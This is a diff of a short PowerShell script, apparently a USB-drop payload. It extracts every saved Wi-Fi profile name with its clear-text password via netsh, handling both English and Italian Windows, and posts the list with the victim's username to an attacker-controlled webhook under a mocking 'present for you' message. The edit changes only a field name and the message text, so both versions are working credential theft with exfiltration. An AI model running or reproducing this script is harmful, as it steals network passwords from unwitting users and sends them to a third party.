@@ -1,8 +1,8 @@
 ############################################################################################################################################################
 [cultureinfo]::CurrentUICulture = 'en-US'
 [System.Threading.Thread]::CurrentThread.CurrentUICulture = 'en-US'
-$wifiProfiles_EN = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID-NAME=$name;PASS=$pass }} | Format-Table -AutoSize | Out-String
-$wifiProfiles_IT = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Contenuto Chiave\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID-NAME=$name;PASS=$pass }} | Format-Table -AutoSize | Out-String
+$wifiProfiles_EN = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASS=$pass }} | Format-Table -AutoSize | Out-String
+$wifiProfiles_IT = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Contenuto Chiave\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASS=$pass }} | Format-Table -AutoSize | Out-String
 ############################################################################################################################################################
 
 
@@ -10,7 +10,7 @@ $wifiProfiles_IT = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$nam
 $hookurl = "$dc"
 $Body = @{
   'username' = $env:username 
-  'content' = "I got a nice present 4 ya :) `n Ita: $wifiProfiles_IT `n Eng: $wifiProfiles_EN `n "
+  'content' = "Ciao! `n Ho un regalino per te :) `n $wifiProfiles_IT $wifiProfiles_EN "
 }
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
 
